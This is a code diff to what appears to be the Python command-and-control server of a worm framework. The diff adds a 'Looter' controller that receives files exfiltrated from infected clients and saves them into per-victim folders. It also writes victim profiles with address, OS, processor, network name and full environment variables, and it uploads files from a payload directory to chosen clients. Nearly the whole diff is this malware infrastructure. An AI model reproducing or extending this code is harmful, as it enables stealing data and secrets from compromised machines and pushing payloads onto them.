@@ -11,7 +11,7 @@ from random import randint
 
 from .tools.messenger import Messenger
 from .tools.tasker import Tasker
-from .tools.controlers import BasicControler
+from .tools.controlers import BasicControler, LooterControler
 from .tools.chameleon import Chameleon
 from .tools.handlers import ConnCentral
 from .tools.headers import MrHeader
@@ -240,11 +240,69 @@ class AdvTemplate(BasicTemplate):
     SERV_TYPE = None
     SERV_INFO = None
     WORM_INFO = None
-    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, messenger: object = Messenger, controlers: object = BasicControler, localApi=LocalAPI):
+    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, messenger: object = Messenger, controlers: object = LooterControler, localApi=LocalAPI):
         super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, messenger=messenger, controlers=controlers, localApi=localApi)
         self.outDIR = os.path.join(self.config["OUTPUT_DIR"], self.name)
         if not os.path.exists(self.outDIR):
             os.mkdir(self.outDIR)
+        self._xtraServ = MicroServer
+        self.tagMAP = {}
 
     
-        
+    def setCoordinates(self, fname: str, flen: str, handler: object, dir_index: str = None) -> None:
+        if dir_index:
+            dir_index = self.tagMAP.get(dir_index)
+            if not dir_index:
+                return
+        try:
+            flen = int(flen)
+        except (ValueError, TypeError):
+            self.Msg(f"[!!] ERROR: LOOTER recive file_len bad values: {flen} [!!]", dev=True)
+            return
+        if dir_index:
+            xtra = self._xtraServ(self, flen, fname, dir_index)
+        else:
+            xtra = self._xtraServ(self, flen, fname)
+        self.Tasker.addTask(name="Looter Downloader", func_name=xtra.START, info="Download file threading", types="handlers")
+        handler.sendMsg(f"1 {str(xtra.port)}")
+
+    
+    def prepareWorkplace(self, tag: str, info: str, index_number: str) -> None:
+        tagDir = os.path.join(self._oldConf["OUTPUT_DIR"], self.name, tag)
+        if not os.path.exists(tagDir):
+            os.mkdir(tagDir)
+        number = str(len(os.listdir(tagDir)) + 1)
+        newDir = os.path.join(tagDir, f"{tag}{number}")
+        try:
+            os.mkdir(newDir)
+            with open(os.path.join(newDir, "0000000000000_CLIENT_INFO_0000000000000000.txt"), "w") as f:
+                f.write(info)
+        except:
+            return None
+        self.tagMAP[index_number] = newDir
+    
+    def prepareReadMe(self, tag: str, info: str, handler: object) -> str:
+        cliInfo = f" ************ {tag} *********\n"
+        cliInfo += f"--------- {info} -----------\n"
+        cliInfo += f"Address: {handler.Addr}\n"
+        cliInfo += f"Worm Name: {handler.CliName}\n"
+        cliInfo += f"Os System: {handler.Os}\n"
+        cliInfo += f"Processor: {handler.procInfo}\n"
+        cliInfo += f"Platform: {handler.platformInfo}\n"
+        cliInfo += f"Network Name: {handler.networkName}\n"
+        cliInfo += "\n\n\n"
+        cliInfo += handler.EnvVar
+        return cliInfo
+    
+    def uploadFile(self, cliID: str, file_name: str) -> None:
+        if not self.is_listening:
+            self.Msg("[!!] ERROR: Server not listening [!!]")
+            return
+        fpath = os.path.join(self.config["PAYLOAD_DIR"], file_name)
+        if not os.path.exists(fpath):
+            self.Msg(f"[!!] ERROR: file name: {file_name} does not exists in PAYLOAD dir [!!]")
+            return
+        file_len = os.stat(fpath).st_size
+        xtra = self._xtraServ(server_callback=self, file_name=file_name, work="upload")
+        self.Tasker.addTask(name="Looter Uploader", func_name=xtra.START, info="Upload file threading", types="handlers")
+        self.Ctrl.sendMsg2Client(cliID, f"$$UPL$${str(xtra.port)}$${file_name}$${str(file_len)}")
